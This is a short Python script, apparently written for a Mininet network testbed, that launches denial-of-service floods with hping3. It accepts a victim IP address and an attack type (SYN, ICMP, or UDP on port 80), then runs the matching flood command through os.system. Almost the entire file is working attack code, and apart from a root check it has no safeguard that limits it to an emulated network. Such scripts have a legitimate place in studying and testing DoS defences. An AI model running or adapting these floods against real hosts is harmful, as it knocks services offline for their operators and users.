#!/usr/bin/env python3
# ==============================================================================
# simulate_attack.py
#
# A script to launch an hping3-based DoS attack.
# This script is intended to be run from within a Mininet host's terminal.
#
# USAGE:
# 1. In Mininet CLI, open a terminal: mininet> attacker xterm
# 2. In the new xterm window, run this script:
#    python3 ../scripts/simulate_attack.py --victim-ip 10.0.0.1 --attack-type syn
# ==============================================================================

import os
import sys
import argparse

def launch_attack(victim_ip, attack_type):
    """Constructs and executes an hping3 attack command."""
    
    print(f"--- Launching {attack_type.upper()} Flood Attack on {victim_ip} ---")
    
    # Construct the hping3 command based on the attack type
    if attack_type == 'syn':
        # SYN Flood
        command = f"hping3 --flood -S {victim_ip}"
    elif attack_type == 'icmp':
        # ICMP Flood
        command = f"hping3 --flood --icmp {victim_ip}"
    elif attack_type == 'udp':
        # UDP Flood on port 80
        command = f"hping3 --flood --udp -p 80 {victim_ip}"
    else:
        print(f"Error: Unknown attack type '{attack_type}'")
        sys.exit(1)
        
    print(f"Executing command: {command}")
    
    # Execute the command
    try:
        os.system(command)
    except KeyboardInterrupt:
        print("\n--- Attack stopped by user. ---")
    except Exception as e:
        print(f"An error occurred: {e}")
        print("Please ensure hping3 is installed and you are running with root privileges.")

if __name__ == "__main__":
    # Check for root privileges, as hping3 requires them
    if os.geteuid() != 0:
        print("This script requires root privileges to run hping3.")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="Launch a DoS attack using hping3.")
    parser.add_argument("--victim-ip", required=True, help="The IP address of the target host.")
    parser.add_argument(
        "--attack-type", 
        choices=['syn', 'icmp', 'udp'], 
        default='syn', 
        help="The type of flood attack to launch (syn, icmp, or udp)."
    )
    
    args = parser.parse_args()
    
    launch_attack(args.victim_ip, args.attack_type)